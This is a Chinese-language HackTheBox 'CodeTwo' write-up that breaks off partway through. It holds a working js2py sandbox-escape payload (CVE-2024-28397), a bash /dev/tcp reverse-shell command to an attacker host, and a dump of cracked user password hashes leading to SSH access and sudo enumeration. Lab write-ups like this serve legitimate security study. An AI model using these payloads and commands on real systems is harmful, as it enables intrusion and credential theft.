<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HackTheBox-CodeTwo</title>
    <url>/2025/09/04/HackTheBox-CodeTwo/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.10.11.82 -oA ports</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 </span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.82</span><br><span class="line">Host is up (0.090s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.86 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sC -sV -O -p 22,8000 --min-rate 10000 10.10.11.82 -oA details</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 </span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.82</span><br><span class="line">Host is up (0.095s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)</span><br><span class="line">|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)</span><br><span class="line">|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)</span><br><span class="line">8000/tcp open  http    Gunicorn 20.0.4</span><br><span class="line">|_http-title: Welcome to CodePartTwo</span><br><span class="line">|_http-server-header: gunicorn/20.0.4</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.51 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><p>看到有 8000 端口是个 web，详细信息扫描的结果显示，8000 端口是个 <code>Gunicorn 20.0.4</code> ，网上搜索了一下，这是一个用于 UNIX 的 Python WSGI HTTP 服务器，这个版本可能存在请求走私漏洞，要根据后续的渗透过程来看看这个漏洞能否利用。</p>
<p>访问一下 8000 端口：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>上面说，这个网站可以让用户执行、保存他们的 <code>javascript</code> 代码。</p>
<p><strong>“GO TO DASHBOARD”</strong> 之后，我们可以注册一个账号并登陆，登录之后就是一个代码的输入框，可以执行和保存代码：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>看到可以执行代码，想到的是可能存在 <code>沙箱逃逸</code> ，但我们还得知道后台是什么东西在执行这个代码，在前端搜搜信息，没有发现进一步的关于后台的内容。</p>
<p>用 <code>dirsearch</code> 扫描一下目录看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ dirsearch -u http://10.10.11.82:8000                                      </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/HTB/codetwo/reports/http_10.10.11.82_8000/_25-09-04_11-39-01.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.10.11.82:8000/</span><br><span class="line"></span><br><span class="line">[11:39:01] Starting: </span><br><span class="line">[11:39:59] 302 -  199B  - /dashboard  -&gt;  /login                            </span><br><span class="line">[11:40:02] 200 -   10KB - /download                                         </span><br><span class="line">[11:40:19] 200 -  667B  - /login                                            </span><br><span class="line">[11:40:20] 302 -  189B  - /logout  -&gt;  /                                    </span><br><span class="line">[11:40:36] 200 -  651B  - /register                                         </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<p>有个 <code>download</code> 目录，访问之后，可以下载一个 <code>app.zip</code> ，解压一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://10.10.11.82:8000/download&#x27;</span> --output app.zip </span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 10708  100 10708    0     0  57535      0 --:--:-- --:--:-- --:--:-- 57569</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ unzip app.zip</span><br><span class="line">Archive:  app.zip</span><br><span class="line">   creating: app/</span><br><span class="line">   creating: app/static/</span><br><span class="line">   creating: app/static/css/</span><br><span class="line">  inflating: app/static/css/styles.css  </span><br><span class="line">   creating: app/static/js/</span><br><span class="line">  inflating: app/static/js/script.js  </span><br><span class="line">  inflating: app/app.py              </span><br><span class="line">   creating: app/templates/</span><br><span class="line">  inflating: app/templates/dashboard.html  </span><br><span class="line">  inflating: app/templates/reviews.html  </span><br><span class="line">  inflating: app/templates/index.html  </span><br><span class="line">  inflating: app/templates/base.html  </span><br><span class="line">  inflating: app/templates/register.html  </span><br><span class="line">  inflating: app/templates/login.html  </span><br><span class="line">  inflating: app/requirements.txt    </span><br><span class="line">   creating: app/instance/</span><br><span class="line">  inflating: app/instance/users.db</span><br></pre></td></tr></table></figure>

<p>看到有个 <code>users.db</code> ，用 <code>sqlite3</code> 查看之后发现没有什么数据。</p>
<p>然后还有一个 <code>app.py</code> ，推测应该是网站后台的源码，内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> js2py</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">js2py.disable_pyimport()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3yC0d3PartTw0&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;sqlite:///users.db&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>, nullable=<span class="literal">False</span>)</span><br><span class="line">    password_hash = db.Column(db.String(<span class="number">128</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CodeSnippet</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    code = db.Column(db.Text, nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        user_codes = CodeSnippet.query.filter_by(user_id=session[<span class="string">&#x27;user_id&#x27;</span>]).<span class="built_in">all</span>()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, codes=user_codes)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        password_hash = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        new_user = User(username=username, password_hash=password_hash)</span><br><span class="line">        db.session.add(new_user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        password_hash = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        user = User.query.filter_by(username=username, password_hash=password_hash).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;user_id&#x27;</span>] = user.<span class="built_in">id</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username;</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid credentials&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/save_code&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_code</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        code = request.json.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        new_code = CodeSnippet(user_id=session[<span class="string">&#x27;user_id&#x27;</span>], code=code)</span><br><span class="line">        db.session.add(new_code)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Code saved successfully&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;User not logged in&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&#x27;/home/app/app/static/&#x27;</span>, path=<span class="string">&#x27;app.zip&#x27;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_code/&lt;int:code_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_code</span>(<span class="params">code_id</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        code = CodeSnippet.query.get(code_id)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">and</span> code.user_id == session[<span class="string">&#x27;user_id&#x27;</span>]:</span><br><span class="line">            db.session.delete(code)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Code deleted successfully&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Code not found&quot;</span>&#125;), <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;User not logged in&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/run_code&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_code</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code = request.json.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        result = js2py.eval_js(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;result&#x27;</span>: result&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        db.create_all()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>上面泄漏了 <code>app.secret_key = &#39;S3cr3tK3yC0d3PartTw0&#39;</code>。</p>
<p>同时，我们发现这里 <code>result = js2py.eval_js(code)</code> ，他是用 <code>js2py</code> 执行的我们写的代码，搜索一下 <strong>js2py</strong> 有没有什么漏洞。</p>
<p>发现有一个 <code>CVE-2024-28397</code> ，沙箱逃逸，可以执行任意代码， <strong>payload</strong> 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cmd = <span class="string">&quot;calc;&quot;</span></span><br><span class="line"><span class="keyword">let</span> obj</span><br><span class="line">obj = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(&#123;&#125;).<span class="property">__getattribute__</span>.<span class="property">__class__</span>.<span class="property">__base__</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findpopen</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> o.<span class="title function_">__subclasses__</span>()) &#123;</span><br><span class="line">        <span class="keyword">let</span> item = o.<span class="title function_">__subclasses__</span>()[i]</span><br><span class="line">        <span class="keyword">if</span>(item.<span class="property">__module__</span> == <span class="string">&quot;subprocess&quot;</span> &amp;&amp; item.<span class="property">__name__</span> == <span class="string">&quot;Popen&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> item</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">n11 = <span class="title function_">findpopen</span>(obj)(cmd, -<span class="number">1</span>, <span class="literal">null</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(n11)</span><br></pre></td></tr></table></figure>

<p>其中的 <code>cmd</code> 就是要执行的命令，测试发现页面没有回显，用 <code>nc</code> 探测自己的 ip ，接收到了远程靶机的连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo/app]</span><br><span class="line">└─$ nc -nvlp 1234                                           </span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 10.10.11.82 48622</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>验证出可以执行命令，用 <code>/bin/bash -c &#39;/bin/bash -i &gt;&amp;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;</code> 进行反弹 shell，本地接收到了 shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo/app]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 10.10.11.82 60966</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">app@codeparttwo:~/app$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在 <code>/home/app/app/instance</code> 目录下，也发现了一个 <code>users.db</code> ，下载下来，在里面发现了用户名和密码等信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ sqlite3 users.db                               </span><br><span class="line">SQLite version 3.46.1 2024-08-13 09:16:08</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">code_snippet  user        </span><br><span class="line">sqlite&gt; <span class="keyword">select</span> * from user;</span><br><span class="line">1|marco|649c9d65a206a75f5abe509fe128bce5</span><br><span class="line">2|app|a97588c0e2fa3a024876339e27aeb42e</span><br><span class="line">3|<span class="built_in">test</span>|16d7a4fca7442dda3ad93c9a726597e4</span><br><span class="line">4|triet|5b208189fc2071dd36a877ff680b3603</span><br><span class="line">sqlite&gt; </span><br></pre></td></tr></table></figure>

<p>在靶机的 <code>home</code> 目录里面，是存在 <code>marco</code> 这个用户的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">app@codeparttwo:~/app$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">app@codeparttwo:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">app</span><br><span class="line">marco</span><br><span class="line">app@codeparttwo:/home$</span><br></pre></td></tr></table></figure>

<p>因此上面那个 <code>marco</code> 用户的密码说不定可以用来进行 <code>ssh</code> 登录。</p>
<p>在 <a href="https://crackstation.net/"><code>crackstation</code></a> 里破解了该用户的密码：</p>
<p><img src="image3.webp" alt="image3"></p>
<p>尝试用该密码进行 <strong>ssh</strong> 登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ ssh marco@10.10.11.82</span><br><span class="line">marco@10.10.11.82<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Thu 04 Sep 2025 07:40:31 AM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.09</span></span><br><span class="line"><span class="string">  Usage of /:            57.2% of 5.08GB</span></span><br><span class="line"><span class="string">  Memory usage:          24%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             276</span></span><br><span class="line"><span class="string">  Users logged in:       0</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.10.11.82</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:c568</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  =&gt; There are 3 zombie processes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Infrastructure is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Infra to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">marco@codeparttwo:~$</span></span><br></pre></td></tr></table></figure>

<p>在 <code>marco</code> 的家目录下拿到了 <code>user flag</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">marco@codeparttwo:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">3a9ac3755d733e1eb158a6c8db79d1f8</span><br></pre></td></tr></table></figure>

<p><code>sudo -l</code> 发现 <code>marco</code> 用户可以执行 <code>npbackup-cli</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">marco@codeparttwo:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> marco on codeparttwo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User marco may run the following commands on codeparttwo:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli</span><br></pre></td></tr></table></figure>

<p>看看这个东西怎么用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">marco@codeparttwo:~$ npbackup-cli -h</span><br><span class="line">usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--<span class="built_in">ls</span> [LS]] [--find FIND] [--forget FORGET] [--policy]</span><br><span class="line">                    [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS]</span><br><span class="line">                    [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]</span><br><span class="line">                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache]</span><br><span class="line">                    [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config] [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION]</span><br><span class="line">                    [--create-key CREATE_KEY] [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]</span><br><span class="line">                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]</span><br><span class="line"></span><br><span class="line">Portable Network Backup Client This program is distributed under the GNU General Public License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome</span><br><span class="line">to redistribute it under certain conditions; Please <span class="built_in">type</span> --license <span class="keyword">for</span> more info.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -c CONFIG_FILE, --config-file CONFIG_FILE</span><br><span class="line">                        Path to alternative configuration file (defaults to current <span class="built_in">dir</span>/npbackup.conf)</span><br><span class="line">  --repo-name REPO_NAME</span><br><span class="line">                        Name of the repository to work with. Defaults to <span class="string">&#x27;default&#x27;</span>. This can also be a comma separated list of repo names. Can accept special name <span class="string">&#x27;__all__&#x27;</span> to</span><br><span class="line">                        work with all repositories.</span><br><span class="line">  --repo-group REPO_GROUP</span><br><span class="line">                        Comme separated list of <span class="built_in">groups</span> to work with. Can accept special name <span class="string">&#x27;__all__&#x27;</span> to work with all repositories.</span><br><span class="line">  -b, --backup          Run a backup</span><br><span class="line">  -f, --force           Force running a backup regardless of existing backups age</span><br><span class="line">  -r RESTORE, --restore RESTORE</span><br><span class="line">                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than latest</span><br><span class="line">  -s, --snapshots       Show current snapshots</span><br><span class="line">  --<span class="built_in">ls</span> [LS]             Show content given snapshot. When no snapshot <span class="built_in">id</span> is given, latest is used</span><br><span class="line">  --find FIND           Find full path of given file / directory</span><br><span class="line">  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)</span><br><span class="line">  --policy              Apply retention policy to snapshots (forget snapshots)</span><br><span class="line">  --housekeeping        Run --check quick, --policy and --prune <span class="keyword">in</span> one go</span><br><span class="line">  --quick-check         Deprecated <span class="keyword">in</span> favor of --<span class="string">&#x27;check quick&#x27;</span>. Quick check repository</span><br><span class="line">  --full-check          Deprecated <span class="keyword">in</span> favor of <span class="string">&#x27;--check full&#x27;</span>. Full check repository (<span class="built_in">read</span> all data)</span><br><span class="line">  --check CHECK         Checks the repository. Valid arguments are <span class="string">&#x27;quick&#x27;</span> (metadata check) and <span class="string">&#x27;full&#x27;</span> (metadata + data check)</span><br><span class="line">  --prune [PRUNE]       Prune data <span class="keyword">in</span> repository, also accepts max parameter <span class="keyword">in</span> order prune reclaiming maximum space</span><br><span class="line">  --prune-max           Deprecated <span class="keyword">in</span> favor of --prune max</span><br><span class="line">  --unlock              Unlock repository</span><br><span class="line">  --repair-index        Deprecated <span class="keyword">in</span> favor of <span class="string">&#x27;--repair index&#x27;</span>.Repair repo index</span><br><span class="line">  --repair-packs REPAIR_PACKS</span><br><span class="line">                        Deprecated <span class="keyword">in</span> favor of <span class="string">&#x27;--repair packs&#x27;</span>. Repair repo packs ids given by --repair-packs</span><br><span class="line">  --repair-snapshots    Deprecated <span class="keyword">in</span> favor of <span class="string">&#x27;--repair snapshots&#x27;</span>.Repair repo snapshots</span><br><span class="line">  --repair REPAIR       Repair the repository. Valid arguments are <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;snapshots&#x27;</span>, or <span class="string">&#x27;packs&#x27;</span></span><br><span class="line">  --recover             Recover lost repo snapshots</span><br><span class="line">  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects</span><br><span class="line">  --dump DUMP           Dump a specific file to stdout (full path given by --<span class="built_in">ls</span>), use with --dump [file], add --snapshot-id to specify a snapshot other than latest</span><br><span class="line">  --stats [STATS]       Get repository statistics. If snapshot <span class="built_in">id</span> is given, only snapshot statistics will be shown. You may also pass <span class="string">&quot;--mode raw-data&quot;</span> or <span class="string">&quot;--mode debug&quot;</span> (with</span><br><span class="line">                        double quotes) to get full repo statistics</span><br><span class="line">  --raw RAW             Run raw <span class="built_in">command</span> against backend. Use with --raw <span class="string">&quot;my raw backend command&quot;</span></span><br><span class="line">  --init                Manually initialize a repo (is <span class="keyword">done</span> automatically on first backup)</span><br><span class="line">  --has-recent-snapshot</span><br><span class="line">                        Check <span class="keyword">if</span> a recent snapshot exists</span><br><span class="line">  --restore-includes 